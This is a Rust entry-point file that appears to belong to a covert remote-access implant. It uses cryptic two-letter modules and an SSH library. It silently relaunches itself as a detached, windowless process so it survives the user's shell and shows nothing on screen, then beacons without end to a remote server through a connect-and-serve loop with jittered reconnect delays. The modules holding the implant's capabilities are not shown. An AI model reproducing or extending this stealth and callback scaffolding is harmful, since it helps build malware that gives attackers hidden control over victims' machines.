mod cf;
mod dl;
mod ev;
mod hd;
mod ky;
mod ob;
mod pr;
mod pt;
mod sc;
mod sy;
mod tl;

use std::sync::Arc;

// i686-pc-windows-gnu + panic=abort leaves dangling _Unwind_Resume
// references with some mingw toolchains; with abort the symbol is never
// actually called, so a stub satisfies the linker.
#[cfg(all(target_arch = "x86", target_os = "windows"))]
#[no_mangle]
pub extern "C" fn _Unwind_Resume() -> ! {
    std::process::abort()
}

/// Re-launch ourselves fully detached (no console, own process group) so the
/// process survives the launching shell closing and never opens a window on
/// GUI launches. Mirrors the Go client's Fork().
#[cfg(windows)]
fn detach_restart() -> bool {
    use std::os::windows::process::CommandExt;
    const DETACHED_PROCESS: u32 = 0x0000_0008;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let Ok(exe) = std::env::current_exe() else {
        return false;
    };
    let mut cmd = std::process::Command::new(exe);
    cmd.args(std::env::args_os().skip(1))
        // child marker so we do not fork-loop
        .env("_", "1")
        .creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    cmd.spawn().is_ok()
}

#[cfg(not(windows))]
fn detach_restart() -> bool {
    false
}

fn main() {
    let is_child = std::env::var_os("_").is_some();
    let wants_foreground = std::env::args().any(|a| a == "--foreground" || a == "-f");
    if !is_child && !wants_foreground && detach_restart() {
        std::process::exit(0);
    }

    ev::init();
    #[cfg(feature = "debug-log")]
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("russh=trace")).init();
    let cfg = cf::load();
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
        .expect("runtime");
    runtime.block_on(run(cfg));
}

async fn run(cfg: Arc<cf::Config>) {
    loop {
        match sc::connect_and_serve(&cfg).await {
            Ok(_) => {}
            Err(e) => {
                #[cfg(feature = "debug-log")]
                eprintln!("[e] {e}");
                let _ = e;
            }
        }
        // reconnect with backoff, jittered
        ev::sleep_jitter(10, 4).await;
    }
}

pub fn rand_range(max: u64) -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u64)
        .unwrap_or(0);
    if max == 0 { 0 } else { nanos % (max + 1) }
}
